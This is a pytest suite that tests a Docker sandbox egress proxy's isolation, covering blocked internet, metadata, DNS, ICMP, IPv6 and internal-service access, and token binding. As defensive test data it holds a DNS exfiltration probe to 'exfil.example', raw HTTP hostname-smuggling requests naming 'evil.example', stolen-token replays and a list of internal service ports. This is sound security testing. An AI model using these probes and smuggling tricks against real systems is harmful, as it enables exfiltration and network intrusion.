"""SEC-1..SEC-14: the egress security cases on the real Docker broker (P5.4 §2).

A sandbox with an allowlist reaches only the gateways, through the proxy, with
only its placeholder; the proxy injects the run-bound token and refuses the
rest. runc lane on ``pxh-sandbox:x1``; the gVisor lane skips where the daemon
has no ``runsc``. Targets are our own ``pxh-`` containers and the shared
``pxh-mongo-rs``/``pxh-redis`` (probed, never written to).
"""

from __future__ import annotations

import json
import re
import socket
from typing import TYPE_CHECKING

import pytest

from harness_core.sandbox.egress.bindings import EGRESS_REVOKED, Revocation
from harness_core.sandbox.egress.policy import POSTGRES_PORT
from harness_core.sandbox.egress.tokens import InMemoryTokenSource
from harness_core.sandbox.egress.types import EGRESS_CONTROL_PORT, EGRESS_PROXY_PORT
from harness_core.sandbox.errors import SandboxRefusal
from harness_core.sandbox.types import (
    EgressDestination,
    EgressPolicy,
    LeaseRef,
    MountSpec,
    Resources,
    SandboxSpec,
    TokenRoute,
)
from harness_core.testing.sandbox.contract import WORK, parse_http, placeholder, run
from tests.unit.agent_loop_lib.sandbox.contract.conftest import DOCKER_TEST_IMAGE
from tests.unit.harness.sandbox_broker.egress_stack import (
    GATEWAY_PORT,
    OWNER,
    TARGET_PORT,
    resolve,
    rig_probe,
    sandbox_curl,
    scan_for_secret,
    start_decoy,
    tcp_probe,
)

if TYPE_CHECKING:
    from collections.abc import AsyncIterator, Mapping, Sequence

    from app.harness.sandbox.docker_broker import (
        DockerSandboxBroker,
        DockerSandboxHandle,
    )
    from harness_core.sandbox.egress.client import RemoteEgressBindings
    from harness_core.sandbox.types import RuntimeMode
    from tests.unit.harness.sandbox_broker.egress_stack import EgressStack

pytestmark = [pytest.mark.docker, pytest.mark.timeout(600, method="thread")]

LEASE = LeaseRef("worker-sec", 1)
MODEL = f"http://model-gateway:{EGRESS_PROXY_PORT}"
VENDOR = "sk-ant-api03-" + "Q" * 24


class Sandbox:
    def __init__(self, handle: DockerSandboxHandle, model_ph: str, tools_ph: str, spec: SandboxSpec) -> None:
        self.handle = handle
        self.model_ph = model_ph
        self.tools_ph = tools_ph
        self.spec = spec

    async def out(self, argv: Sequence[str], *, stdin: bytes | None = None) -> str:
        process = await self.handle.exec(argv, env={}, stdin=stdin is not None)
        if stdin is not None:
            await process.write(stdin)
            await process.close_stdin()
        out, err, _ = await run(process, timeout_s=60)
        return (out + err).decode("utf-8", "replace").strip()

    async def http(
        self,
        url: str,
        headers: Mapping[str, str] | None = None,
        *,
        via_proxy: bool = True,
        method: str = "GET",
        data: str | None = None,
    ) -> tuple[int, str, str]:
        process = await self.handle.exec(
            sandbox_curl(url, headers or {}, via_proxy=via_proxy, method=method, data=data), env={}
        )
        out, _, _ = await run(process, timeout_s=60)
        return parse_http(out)

    async def probe(self, host: str, port: int) -> str:
        return await self.out(tcp_probe(host, port))


async def acquire(
    broker: DockerSandboxBroker,
    mode: RuntimeMode,
    *,
    run_id: str,
    extra: Sequence[EgressDestination] = (),
    org: str = "org-sec",
    session: str = "ses-sec",
) -> Sandbox:
    model_ph, tools_ph = placeholder(), placeholder()
    spec = SandboxSpec(
        image_digest=DOCKER_TEST_IMAGE,
        mode=mode,
        resources=Resources(cpus=0.5, memory_mb=256, pids=64, scratch_mb=64),
        egress=EgressPolicy(
            destinations=(
                EgressDestination("model-gateway", (EGRESS_PROXY_PORT,)),
                EgressDestination("tool-gateway", (EGRESS_PROXY_PORT,)),
                *extra,
            ),
            token_routes=(
                TokenRoute(model_ph, "model-gateway", "gateway:model"),
                TokenRoute(tools_ph, "tool-gateway", "gateway:tools"),
            ),
        ),
        mounts=(MountSpec(WORK),),
        labels={**OWNER, "orgId": org, "sessionId": session, "runId": run_id, "attemptId": f"{run_id}-a1"},
    )
    handle = await broker.acquire(spec, lease=LEASE, idempotency_key=f"k-{run_id}-{model_ph}")
    return Sandbox(handle, model_ph, tools_ph, spec)


def unreachable(result: str) -> bool:
    return not result.startswith("open")


def _container_ip(stack: EgressStack, name: str) -> str | None:
    try:
        networks = stack.client.api.inspect_container(name)["NetworkSettings"]["Networks"]
    except Exception:
        return None
    return next((n["IPAddress"] for n in networks.values() if n.get("IPAddress")), None)


def _host_address() -> str:
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect(("192.0.2.1", 9))
        return probe.getsockname()[0]
    finally:
        probe.close()


@pytest.fixture
def broker(egress_docker_broker: DockerSandboxBroker) -> DockerSandboxBroker:
    return egress_docker_broker


@pytest.fixture
async def sandbox(broker: DockerSandboxBroker, runtime_mode: RuntimeMode) -> AsyncIterator[Sandbox]:
    box = await acquire(broker, runtime_mode, run_id="run-sec-a")
    yield box
    await broker.release(box.handle)


async def test_sec1_direct_internet_by_address_has_no_route(sandbox: Sandbox) -> None:
    for host, port in (("1.1.1.1", 80), ("1.1.1.1", 443), ("8.8.8.8", 53)):
        result = await sandbox.probe(host, port)
        assert unreachable(result), (host, port, result)
    assert (await sandbox.http("http://1.1.1.1/", via_proxy=False))[0] == 0


async def test_sec2_direct_internet_by_name_has_no_dns_and_the_proxy_refuses_it(sandbox: Sandbox) -> None:
    assert (await sandbox.http("http://example.com/", via_proxy=False))[0] == 0
    assert (await sandbox.http("http://example.com/"))[:2] == (403, "destination_not_allowed")
    assert (await sandbox.http("https://example.com/"))[0] in (0, 403)


async def test_sec3_the_metadata_address_is_unreachable_directly_and_through_the_proxy(
    broker: DockerSandboxBroker, runtime_mode: RuntimeMode
) -> None:
    box = await acquire(broker, runtime_mode, run_id="run-sec-3", extra=(EgressDestination("169.254.169.254", (80,)),))
    try:
        assert unreachable(await box.probe("169.254.169.254", 80))
        assert (await box.http("http://169.254.169.254/metadata/instance", {"Metadata": "true"}))[:2] == (
            403,
            "destination_private_address",
        )
        assert (await box.http("http://169.254.169.254:8080/"))[:2] == (403, "destination_not_allowed")
    finally:
        await broker.release(box.handle)


async def test_sec4_other_containers_are_unreachable_by_address_and_refused_by_name(
    broker: DockerSandboxBroker, runtime_mode: RuntimeMode, egress_stack: EgressStack
) -> None:
    target_ip = egress_stack.address(egress_stack.target)
    box = await acquire(
        broker, runtime_mode, run_id="run-sec-4", extra=(EgressDestination(egress_stack.target, (TARGET_PORT,)),)
    )
    try:
        targets = [(target_ip, TARGET_PORT), (egress_stack.address(egress_stack.gateway), GATEWAY_PORT)]
        for name, port in (("pxh-mongo-rs", 27017), ("pxh-redis", 6379)):
            ip = _container_ip(egress_stack, name)
            if ip:
                targets.append((ip, port))
        for host, port in targets:
            result = await box.probe(host, port)
            assert unreachable(result), (host, port, result)
        assert (await box.http(f"http://{egress_stack.target}:{TARGET_PORT}/"))[:2] == (
            403,
            "destination_private_address",
        )
        assert (await box.http(f"http://{target_ip}:{TARGET_PORT}/"))[:2] == (403, "destination_not_allowed")
    finally:
        await broker.release(box.handle)


async def test_sec5_host_services_are_unreachable(sandbox: Sandbox) -> None:
    gateway_of_own_net = (await sandbox.out(["sh", "-c", "hostname -i"])).split()[0].rsplit(".", 1)[0] + ".1"
    for host in ("172.17.0.1", _host_address(), gateway_of_own_net):
        for port in (22, 2375, 6379, 27017, 8095):
            result = await sandbox.probe(host, port)
            assert unreachable(result), (host, port, result)


async def test_sec6_another_sandbox_and_its_proxy_address_are_unreachable(
    broker: DockerSandboxBroker, runtime_mode: RuntimeMode, sandbox: Sandbox
) -> None:
    other = await acquire(broker, runtime_mode, run_id="run-sec-6")
    try:
        other_ip = (await other.out(["sh", "-c", "hostname -i"])).split()[0]
        other_proxy = other_ip.rsplit(".", 1)[0] + "." + str(int(other_ip.rsplit(".", 1)[1]) - 1)
        for host, port in ((other_ip, 7000), (other_proxy, EGRESS_PROXY_PORT), (other_proxy, EGRESS_CONTROL_PORT)):
            result = await sandbox.probe(host, port)
            assert unreachable(result), (host, port, result)
        assert (await sandbox.http(f"http://{other_ip}:7000/"))[:2] == (403, "destination_not_allowed")
    finally:
        await broker.release(other.handle)


async def test_sec7_a_placeholder_or_token_from_another_sandbox_is_refused(
    broker: DockerSandboxBroker, runtime_mode: RuntimeMode, sandbox: Sandbox, egress_stack: EgressStack
) -> None:
    assert (await sandbox.http(f"{MODEL}/v1/a", {"Authorization": f"Bearer {sandbox.model_ph}"}))[0] == 200
    a_token = InMemoryTokenSource.derive(egress_stack.secret, sandbox.handle.id, "gateway:model", 0)
    a_next = InMemoryTokenSource.derive(egress_stack.secret, sandbox.handle.id, "gateway:model", 1)
    other = await acquire(broker, runtime_mode, run_id="run-sec-7")
    try:
        before = egress_stack.gateway_requests()
        cases = [
            ({"Authorization": f"Bearer {sandbox.model_ph}"}, None, "placeholder_foreign"),
            ({"Authorization": f"Bearer {a_token}"}, None, "token_replayed"),
            ({"Authorization": f"Bearer {a_next}"}, None, "caller_authorization"),
            ({"Authorization": f"Bearer {other.model_ph}"}, f'{{"stolen": "{a_token}"}}', "token_replayed"),
        ]
        for headers, data, reason in cases:
            method = "POST" if data else "GET"
            assert (await other.http(f"{MODEL}/v1/b", headers, method=method, data=data))[:2] == (403, reason)
        assert egress_stack.gateway_requests() == before
    finally:
        await broker.release(other.handle)


async def test_sec8_a_vendor_token_in_arguments_never_leaves(sandbox: Sandbox, egress_stack: EgressStack) -> None:
    auth = {"Authorization": f"Bearer {sandbox.model_ph}"}
    before = egress_stack.gateway_requests()
    for url, headers, data in (
        (f"{MODEL}/v1/tools/call", {**auth, "X-Api-Key": VENDOR}, "{}"),
        (f"{MODEL}/v1/tools/call?key={VENDOR}", auth, "{}"),
    ):
        assert (await sandbox.http(url, headers, method="POST", data=data))[:2] == (403, "forbidden_pattern")
    assert egress_stack.gateway_requests() == before
    # WP-103: in a model call's body the shape is hidden and the call goes on; the key itself never reaches the gateway.
    for data in (f'{{"arguments": {{"key": "{VENDOR}"}}}}', '{"k": "ghp_' + "a" * 36 + '"}'):
        assert (await sandbox.http(f"{MODEL}/v1/x", auth, method="POST", data=data))[1] != "forbidden_pattern"
    assert egress_stack.gateway_requests() == before + 2
    assert VENDOR not in egress_stack.logs(egress_stack.gateway)


async def test_sec9_there_is_no_dns_inside_the_sandbox(sandbox: Sandbox, egress_stack: EgressStack) -> None:
    for name in ("example.com", "pxh-mongo-rs", egress_stack.target, egress_stack.gateway, "metadata.google.internal"):
        result = await sandbox.out(resolve(name))
        assert not result.startswith("resolved"), (name, result)
    # The hosts file names the proxy and the gateways; nothing else resolves.
    assert (await sandbox.out(resolve("model-gateway"))).startswith("resolved 10.213.")


async def test_sec10_the_proxy_without_the_placeholder_refuses(sandbox: Sandbox) -> None:
    assert (await sandbox.http(f"{MODEL}/v1/x"))[:2] == (403, "placeholder_missing")
    assert (await sandbox.http(f"{MODEL}/v1/x", via_proxy=False))[:2] == (403, "placeholder_missing")
    assert (await sandbox.http(f"{MODEL}/v1/x", {"Authorization": "Bearer guessed-0000000000000000"}))[:2] == (
        403,
        "caller_authorization",
    )
    tools = f"http://tool-gateway:{EGRESS_PROXY_PORT}/mcp"
    assert (await sandbox.http(tools, {"Authorization": f"Bearer {sandbox.model_ph}"}))[:2] == (
        403,
        "placeholder_wrong_destination",
    )


async def test_sec11_the_gateway_gets_the_token_the_sandbox_never_holds_it(
    sandbox: Sandbox, egress_stack: EgressStack
) -> None:
    token = InMemoryTokenSource.derive(egress_stack.secret, sandbox.handle.id, "gateway:model", 0)
    tools_token = InMemoryTokenSource.derive(egress_stack.secret, sandbox.handle.id, "gateway:tools", 0)
    status, reason, body = await sandbox.http(
        f"{MODEL}/v1/chat/completions", {"Authorization": f"Bearer {sandbox.model_ph}"}, via_proxy=False,
        method="POST", data='{"model": "m"}',
    )
    assert (status, reason) == (200, "-")
    assert sandbox.model_ph in body and token not in body
    tools = f"http://tool-gateway:{EGRESS_PROXY_PORT}/mcp"
    assert (await sandbox.http(tools, {"Authorization": f"Bearer {sandbox.tools_ph}"}))[0] == 200
    assert await egress_stack.wait_for_authorization(f"Bearer {token}")
    assert await egress_stack.wait_for_authorization(f"Bearer {tools_token}")
    for secret in (token, tools_token):
        assert await sandbox.out(scan_for_secret(), stdin=secret.encode()) == "hits 0"
    # The scanner finds what is there: a control run with the placeholder, which the sandbox holds in argv.
    holder = await sandbox.handle.exec(["/bin/sh", "-c", "sleep 30", sandbox.model_ph], env={})
    try:
        found = await sandbox.out(scan_for_secret(), stdin=sandbox.model_ph.encode())
        assert int(found.split()[1]) >= 1, found
    finally:
        await holder.signal(9)


async def test_sec12_the_control_plane_is_not_reachable_from_a_sandbox(sandbox: Sandbox) -> None:
    """E2E4 EC-8: no TCP path at all (the control listener binds only the rig network's address); the application's
    ``control_from_sandbox`` refusal stays as the second layer (PS-3)."""
    assert unreachable(await sandbox.probe("egress-proxy", EGRESS_CONTROL_PORT))
    # Positive control: the same address answers on the data port, so the probe can tell open from closed.
    assert not unreachable(await sandbox.probe("egress-proxy", EGRESS_PROXY_PORT))


async def test_sec13_each_refusal_is_logged_once_with_correlation_ids_and_no_secret(
    broker: DockerSandboxBroker, runtime_mode: RuntimeMode, egress_stack: EgressStack
) -> None:
    box = await acquire(broker, runtime_mode, run_id="run-sec-13")
    try:
        assert (await box.http(f"{MODEL}/v1/ok", {"Authorization": f"Bearer {box.model_ph}"}))[0] == 200
        reasons = ["destination_not_allowed", "placeholder_missing", "forbidden_pattern"]
        assert (await box.http("http://example.com/"))[1] == reasons[0]
        assert (await box.http(f"{MODEL}/v1/x"))[1] == reasons[1]
        assert (await box.http(f"{MODEL}/v1/x?k={VENDOR}", {"Authorization": f"Bearer {box.model_ph}"}))[1] == reasons[2]
    finally:
        await broker.release(box.handle)
    logs = egress_stack.logs(egress_stack.proxy)
    lines = [line for line in logs.splitlines() if "egress.refused" in line and f"sandboxId={box.handle.id}" in line]
    assert sorted(re.search(r"reason=(\S+)", line).group(1) for line in lines) == sorted(reasons)  # type: ignore[union-attr]
    for line in lines:
        assert line.startswith("WARNING")
        for field in ("orgId=org-sec", "sessionId=ses-sec", "runId=run-sec-13", "attemptId=run-sec-13-a1", "proxyRequestId="):
            assert field in line, (field, line)
    token = InMemoryTokenSource.derive(egress_stack.secret, box.handle.id, "gateway:model", 0)
    for secret in (token, box.model_ph, VENDOR, "/v1/x"):
        assert secret not in logs



# WP-14: the probes SEC-1..SEC-13 did not name (C6.07, C6.08, C20.39, C6.14). Every probe runs inside a pxh- sandbox
# with the spec's cgroup limits and its own timeout; targets are probed (connect, one datagram), never written to.

# Many (host, port) probes at once from inside the sandbox: JSON pairs on stdin, JSON results out.
_PROBE_MANY = r"""
import json, socket, sys
from concurrent.futures import ThreadPoolExecutor
def probe(pair):
    host, port = pair
    s = socket.socket(socket.AF_INET6 if ":" in host else socket.AF_INET)
    s.settimeout(2)
    try:
        s.connect((host, port))
        return "open"
    except Exception as exc:
        return f"{type(exc).__name__} {getattr(exc, 'errno', None)}"
    finally:
        s.close()
pairs = [tuple(p) for p in json.load(sys.stdin)]
with ThreadPoolExecutor(8) as pool:
    print(json.dumps([[h, p, r] for (h, p), r in zip(pairs, pool.map(probe, pairs))]))
"""

# The ways out that are not TCP: DNS over UDP to every resolver a sandbox could name, ICMP, IPv6. Prints JSON.
_NON_TCP = r"""
import json, os, socket, struct, sys
targets = json.loads(sys.argv[1])
def dns_query(name):
    labels = b"".join(bytes([len(p)]) + p.encode() for p in name.split("."))
    return struct.pack(">HHHHHH", 0x5a5a, 0x0100, 1, 0, 0, 0) + labels + b"\x00" + struct.pack(">HH", 1, 1)
def udp(host, port, payload):
    s = socket.socket(socket.AF_INET6 if ":" in host else socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2)
    try:
        s.sendto(payload, (host, port))
        data, _ = s.recvfrom(512)
        rcode, answers = struct.unpack(">H", data[2:4])[0] & 0xF, struct.unpack(">H", data[6:8])[0]
        # A resolver that answers but resolves nothing (Docker's own on an internal network: SERVFAIL) is no way out.
        return "answered" if rcode == 0 and answers else f"empty rcode={rcode}"
    except Exception as exc:
        return type(exc).__name__
    finally:
        s.close()
def icmp_echo(host):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_ICMP)
    except OSError as exc:
        return "no_socket " + type(exc).__name__
    s.settimeout(2)
    try:
        s.sendto(struct.pack(">BBHHH", 8, 0, 0, 0, 1) + b"pxh-probe", (host, 0))
        s.recvfrom(512)
        return "answered"
    except Exception as exc:
        return type(exc).__name__
    finally:
        s.close()
out = {"udp": {}, "icmp": {}}
resolvers = [l.split()[1] for l in open("/etc/resolv.conf") if l.startswith("nameserver")] if os.path.exists("/etc/resolv.conf") else []
for host in targets["udp"] + resolvers:
    out["udp"][host] = udp(host, 53, dns_query(targets["exfil"]))
for host in targets["icmp"]:
    out["icmp"][host] = icmp_echo(host)
try:
    socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    out["raw"] = "created"
except OSError as exc:
    out["raw"] = type(exc).__name__
try:
    socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    out["packet"] = "created"
except OSError as exc:
    out["packet"] = type(exc).__name__
v6 = []
if os.path.exists("/proc/net/if_inet6"):
    for line in open("/proc/net/if_inet6"):
        address, scope, device = line.split()[0], int(line.split()[3], 16), line.split()[5]
        # gVisor lists the loopback ::1 with scope 0 (global) where Linux says host (0x10): loopback is not a way out.
        if scope == 0 and device != "lo" and address != "0" * 31 + "1":
            v6.append(address)
out["global_ipv6"] = v6
out["resolvers"] = resolvers
print(json.dumps(out))
"""

# Sends the raw request on stdin to the proxy and prints the status line and the refusal header.
_RAW_HTTP = r"""
import socket, sys
s = socket.create_connection(("egress-proxy", int(sys.argv[1])), timeout=10)
s.sendall(sys.stdin.buffer.read())
data = b""
try:
    while b"\r\n\r\n" not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
except socket.timeout:
    pass
head = data.split(b"\r\n\r\n")[0].decode("latin-1").split("\r\n")
refusal = next((h.split(":", 1)[1].strip() for h in head[1:] if h.lower().startswith("x-egress-refusal:")), "-")
print(head[0] if head and head[0] else "no-answer", refusal)
"""

# PipesHub's own stores and services, by the ports they listen on (SEC-ISO-09): none may be reachable from a sandbox.
INTERNAL_PORTS: dict[str, tuple[int, ...]] = {
    "mongodb": (27017,),
    "redis": (6379,),
    "etcd": (2379, 2380),
    "kafka": (9092, 9093, 29092),
    "zookeeper": (2181,),
    "neo4j": (7474, 7687),
    "arangodb": (8529,),
    "qdrant": (6333, 6334),
    "opensearch": (9200, 9600),
    "postgres": (5432,),
    "node": (3000, 3001, 3002),
    "python": (8000, 8001, 8002, 8081, 8088, 8090, 8091, 8092, 8093),
    "harness": (8095, 8096, 8098, 8099),
}
ALL_INTERNAL_PORTS = sorted({port for ports in INTERNAL_PORTS.values() for port in ports})
# Images whose running containers on the Docker host are PipesHub's stores: probed by address too when present.
STORE_IMAGES = ("mongo", "redis", "etcd", "kafka", "zookeeper", "neo4j", "arangodb", "qdrant", "opensearch", "postgres")


async def probe_many(box: Sandbox, pairs: Sequence[tuple[str, int]]) -> list[tuple[str, int, str]]:
    process = await box.handle.exec(["python3", "-c", _PROBE_MANY], env={}, stdin=True)
    await process.write(json.dumps([list(p) for p in pairs]).encode())
    await process.close_stdin()
    out, err, _ = await run(process, timeout_s=120)
    assert out, err
    return [tuple(item) for item in json.loads(out)]  # type: ignore[misc]


def _store_containers(stack: EgressStack) -> list[tuple[str, str, tuple[int, ...]]]:
    """(name, address, ports) of each running store container on this daemon whose image names a store."""
    found: list[tuple[str, str, tuple[int, ...]]] = []
    for info in stack.client.api.containers(filters={"status": "running"}):
        image = str(info.get("Image", "")).lower()
        kind = next((k for k in STORE_IMAGES if k in image.rsplit("/", 1)[-1]), None)
        if kind is None:
            continue
        ports = INTERNAL_PORTS.get("mongodb" if kind == "mongo" else kind, ())
        for network in (info.get("NetworkSettings", {}).get("Networks") or {}).values():
            if network.get("IPAddress") and ports:
                found.append((info["Names"][0].lstrip("/"), network["IPAddress"], ports))
                break
    return found


@pytest.fixture(scope="module")
def decoy(egress_stack: EgressStack) -> str:
    return start_decoy(egress_stack, "stores", ALL_INTERNAL_PORTS)


async def test_sec_iso_09_every_internal_store_and_service_port_is_unreachable_from_a_sandbox(
    broker: DockerSandboxBroker, runtime_mode: RuntimeMode, egress_stack: EgressStack, decoy: str
) -> None:
    """SEC-ISO-09 / G-38 / C20.39: a stand-in for every store and service port on the deployment's network answers
    off the sandbox plane (positive control) and is unreachable from a sandbox by address, refused by name and by
    address through the proxy even when allowlisted; the host's addresses, the proxy's own address and the real store
    containers on this daemon are probed on every internal port too."""
    decoy_ip = egress_stack.address(decoy)
    for port in ALL_INTERNAL_PORTS:
        assert rig_probe(egress_stack, egress_stack.gateway, decoy_ip, port) == "open", port
    box = await acquire(
        broker,
        runtime_mode,
        run_id="run-sec-iso-09",
        extra=(EgressDestination(decoy, tuple(ALL_INTERNAL_PORTS)), EgressDestination(decoy_ip, tuple(ALL_INTERNAL_PORTS))),
    )
    try:
        own = (await box.out(["sh", "-c", "hostname -i"])).split()[0]
        own_gateway = own.rsplit(".", 1)[0] + ".1"
        proxy_ip = own.rsplit(".", 1)[0] + "." + str(int(own.rsplit(".", 1)[1]) - 1)
        pairs: list[tuple[str, int]] = [(decoy_ip, port) for port in ALL_INTERNAL_PORTS]
        for host in ("172.17.0.1", _host_address(), own_gateway, egress_stack.address(egress_stack.proxy)):
            pairs += [(host, port) for port in ALL_INTERNAL_PORTS]
        # The proxy's own address serves sandboxes on its data port and its PostgreSQL front (WP-06), nothing else.
        pairs += [(proxy_ip, port) for port in ALL_INTERNAL_PORTS if port not in (EGRESS_PROXY_PORT, POSTGRES_PORT)]
        stores = _store_containers(egress_stack)
        pairs += [(address, port) for _, address, ports in stores for port in ports]
        results = await probe_many(box, pairs)
        assert len(results) == len(pairs)
        opened = [(host, port) for host, port, result in results if not unreachable(result)]
        assert opened == [], opened
        for host in (decoy, decoy_ip):
            for port in (27017, 6379, 2379, 9092, 7687, 6333, 3000, 8000, 8098):
                assert (await box.http(f"http://{host}:{port}/"))[:2] == (403, "destination_private_address"), (host, port)
        # Positive control from the sandbox: the proxy's data port is open on the same address that refused the rest.
        assert not unreachable(await box.probe(proxy_ip, EGRESS_PROXY_PORT))
    finally:
        await broker.release(box.handle)


async def test_sec_eg_02_03_04_no_dns_udp_icmp_raw_or_ipv6_way_out(sandbox: Sandbox, egress_stack: EgressStack) -> None:
    """SEC-EG-02/03 (C6.07): no resolver answers (the hosts file is the only name source), no UDP/53 to any
    resolver or the host, no raw or packet socket, no ICMP echo outside, no global IPv6 address and no IPv6 route."""
    own = (await sandbox.out(["sh", "-c", "hostname -i"])).split()[0]
    own_gateway = own.rsplit(".", 1)[0] + ".1"
    exfil = "a1b2c3d4e5f60718293a4b5c6d7e8f90.exfil.example"
    targets = {
        "udp": ["8.8.8.8", "1.1.1.1", "127.0.0.11", "172.17.0.1", own_gateway, _host_address(), "2001:4860:4860::8888"],
        "icmp": ["1.1.1.1", "8.8.8.8", "172.17.0.1", _host_address()],
        "exfil": exfil,
    }
    report = json.loads(await sandbox.out(["python3", "-c", _NON_TCP, json.dumps(targets)]))
    assert all(result != "answered" for result in report["udp"].values()), report["udp"]
    assert all(result != "answered" for result in report["icmp"].values()), report["icmp"]
    assert report["raw"] == "PermissionError" and report["packet"] == "PermissionError", report
    assert report["global_ipv6"] == [], report
    # Docker's resolver on the sandbox's network has no upstream to forward a name to, on any engine version.
    assert "ExtServers: [192.0.2.53]" in await sandbox.out(["cat", "/etc/resolv.conf"])
    for host, port in (("2606:4700:4700::1111", 443), ("2001:4860:4860::8888", 53), ("::ffff:1.1.1.1", 443)):
        assert unreachable(await sandbox.probe(host, port)), (host, port)
    assert not (await sandbox.out(resolve(exfil))).startswith("resolved")
    # A name the proxy does not allowlist is refused there before any lookup: no label leaves through its resolver.
    assert (await sandbox.http(f"http://{exfil}/"))[:2] == (403, "destination_not_allowed")


async def test_sec_eg_04_dns_over_https_and_over_tls_are_blocked(sandbox: Sandbox) -> None:
    """SEC-EG-04 (C6.07): DoT (853) has no route; DoH is refused by the proxy by name and by address, and has no
    route without it."""
    for host in ("1.1.1.1", "8.8.8.8", "9.9.9.9", "2606:4700:4700::1111"):
        assert unreachable(await sandbox.probe(host, 853)), host
    for url in ("http://cloudflare-dns.com/dns-query?name=example.com", "http://1.1.1.1/dns-query", "http://dns.google/resolve?name=x"):
        assert (await sandbox.http(url))[:2] == (403, "destination_not_allowed"), url
    for url in ("https://cloudflare-dns.com/dns-query", "https://dns.google/dns-query"):
        assert (await sandbox.http(url))[0] in (0, 403), url
        assert (await sandbox.http(url, via_proxy=False))[0] == 0, url
    assert (await sandbox.http("https://1.1.1.1/dns-query", via_proxy=False))[0] == 0


RAW_TRICKS = [
    pytest.param(b"GET http://evil.example\x00.model-gateway:8097/v1 HTTP/1.1\r\nHost: model-gateway:8097\r\n", id="nul-target"),
    pytest.param(b"GET http://model-gateway%00.evil.example:8097/v1 HTTP/1.1\r\nHost: model-gateway:8097\r\n", id="pct-nul"),
    pytest.param(b"GET /v1 HTTP/1.1\r\nHost: evil.example\x00.model-gateway:8097\r\n", id="nul-host"),
    pytest.param("GET /v1 HTTP/1.1\r\nHost: mоdel-gateway:8097\r\n".encode(), id="homoglyph-host"),
    pytest.param("GET http://model．gateway:8097/v1 HTTP/1.1\r\nHost: x\r\n".encode(), id="fullwidth-dot"),
    pytest.param(b"GET http://evil.example@model-gateway:8097/v1 HTTP/1.1\r\nHost: model-gateway:8097\r\n", id="userinfo"),
    pytest.param(b"GET http://model-gateway.evil.example:8097/v1 HTTP/1.1\r\nHost: model-gateway:8097\r\n", id="suffix"),
    pytest.param(b"CONNECT evil.example\x00.model-gateway:443 HTTP/1.1\r\nHost: x\r\n", id="nul-connect"),
]


@pytest.mark.parametrize("raw", RAW_TRICKS)
async def test_sec_eg_06_hostname_parser_tricks_are_refused_by_the_real_proxy(
    sandbox: Sandbox, egress_stack: EgressStack, raw: bytes
) -> None:
    """SEC-EG-06 (C6.08): the null-byte, percent, homoglyph, userinfo and suffix forms of an allowlisted gateway, sent
    raw from a sandbox (no client cleans them up first), never reach the gateway."""
    auth = f"Authorization: Bearer {sandbox.model_ph}\r\n\r\n".encode()
    ok = await sandbox.out(
        ["python3", "-c", _RAW_HTTP, str(EGRESS_PROXY_PORT)],
        stdin=b"GET /v1/ok HTTP/1.1\r\nHost: model-gateway:8097\r\nConnection: close\r\n" + auth,
    )
    assert ok.split()[1] == "200", ok
    before = egress_stack.gateway_requests()
    answer = await sandbox.out(["python3", "-c", _RAW_HTTP, str(EGRESS_PROXY_PORT)], stdin=raw + auth)
    status = answer.split()[1] if len(answer.split()) > 1 else answer
    assert status in ("400", "403") or answer.startswith("no-answer"), answer
    assert egress_stack.gateway_requests() == before


async def test_sec_cr_03_revoking_an_org_ends_its_live_sandbox_egress_and_a_rebind_is_refused(
    broker: DockerSandboxBroker, runtime_mode: RuntimeMode, egress_stack: EgressStack, egress_bindings: RemoteEgressBindings
) -> None:
    """SEC-CR-03 / C6.14 / J-19 (egress part): the proxy's revocation of one org's runs ends a live sandbox's model
    calls at once, a broker re-binding it is refused, and a sandbox of another org keeps working."""
    box = await acquire(broker, runtime_mode, run_id="run-kill-a", org="org-kill", session="ses-kill")
    other = await acquire(broker, runtime_mode, run_id="run-kill-b", org="org-other", session="ses-other")
    try:
        auth = {"Authorization": f"Bearer {box.model_ph}"}
        assert (await box.http(f"{MODEL}/v1/before", auth))[0] == 200
        revoked = await egress_bindings.revoke(Revocation(org_id="org-kill"))
        assert revoked == (box.handle.id,)
        before = egress_stack.gateway_requests()
        assert (await box.http(f"{MODEL}/v1/after", auth))[:2] == (403, "unbound_source")
        assert egress_stack.gateway_requests() == before
        assert broker.egress is not None
        with pytest.raises(SandboxRefusal) as caught:
            _ = await broker.egress.bind(box.handle.id, box.spec)
        assert caught.value.reason == EGRESS_REVOKED
        assert box.handle.id not in await egress_bindings.bound()
        assert (await other.http(f"{MODEL}/v1/other", {"Authorization": f"Bearer {other.model_ph}"}))[0] == 200
    finally:
        await broker.release(box.handle)
        await broker.release(other.handle)
